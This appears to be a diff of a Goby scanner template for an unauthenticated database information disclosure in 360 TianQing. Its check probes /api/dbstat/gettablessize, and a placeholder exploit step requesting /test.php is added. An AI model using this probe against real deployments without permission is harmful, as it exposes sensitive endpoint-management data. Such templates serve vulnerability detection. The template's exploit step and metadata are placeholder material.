@@ -1,19 +1,23 @@
 {
-      "Name": "360 Tianqing database information disclosure",
+      "Name": "360 TianQing database information disclosure",
       "Level": "0",
       "Tags": [
             "Disclosure of Sensitive Information"
       ],
       "GobyQuery": "app=\"360-TianQing\"",
-      "Description": "Tianqing has unauthorized unauthorized unauthorized access, resulting in the disclosure of sensitive information",
-      "Product": "360 Tianqing",
-      "Homepage": "https://www.360.cn/",
-      "Author": "PeiQi",
-      "Impact": "",
-      "Recommandation": "<p>undefined</p>",
-      "References": [
-            "http://wiki.peiqi.tech"
-      ],
+      "Description": "",
+      "Product": "360 TianQing",
+      "Homepage": "https://360.net/product-center/Endpoint-Security/management-system",
+      "Author": "",
+      "Impact": "Tianqing has unauthorized unauthorized unauthorized access, resulting in the disclosure of sensitive information.",
+      "Recommendation": "update",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
       "ScanSteps": [
             "AND",
             {
@@ -21,7 +25,7 @@
                         "method": "GET",
                         "uri": "/api/dbstat/gettablessize",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": null,
                         "data_type": "text",
                         "data": ""
                   },
@@ -62,6 +66,43 @@
                   "SetVariable": []
             }
       ],
-      "PostTime": "2021-04-08 16:04:28",
-      "GobyVersion": "1.8.255"
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
 }
